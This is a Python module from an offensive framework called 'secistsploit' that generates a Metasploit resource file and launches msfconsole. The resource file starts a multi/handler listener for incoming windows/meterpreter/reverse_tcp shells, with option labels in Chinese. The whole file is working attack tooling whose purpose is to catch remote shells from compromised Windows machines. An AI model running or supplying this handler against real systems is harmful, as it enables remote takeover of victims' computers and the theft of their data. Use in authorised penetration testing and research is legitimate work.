# -*- coding:utf-8 -*-
import struct
import os
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "handler_MSF",
        "description": "handler_MSF",
        "authors": (
            "demonsec",
        ),
        "references": (
             "www.ggsec.cn "
             "www.secist.com"
        ),

    }

    lhost = OptIP("", "本地监听IP地址")
    lport = OptPort(4444, "本地监听端口")
    payload=OptString("windows/meterpreter/reverse_tcp", "填写payload，默认是windows/meterpreter/reverse_tcp")
    #lhost=(self.port)
    def __init__(self):
        self.endianness = "<"




    def run(self):
        #print_status("secistsploit stopped")
        LHOST=(self.lhost)
        LPORT=(self.lport)
        PAYLOAD=(self.payload)
        #configFile.write('printf "\033c"\n')
        configFile = open('handler_MSF.rc','w')
        configFile.write('printf "\033c"\n')
        configFile.write('use exploit/multi/handler\n')
        configFile.write('set PAYLOAD ')
        configFile.write(PAYLOAD+ '\n')
        configFile.write('set LHOST ' + str(LHOST) + '\n')
        configFile.write('set LPORT ' + str(LPORT) + '\n')
        configFile.write('exploit -j\n')
        configFile.close()
        os.system('msfconsole -r handler_MSF.rc')
        os.remove('handler_MSF.rc')
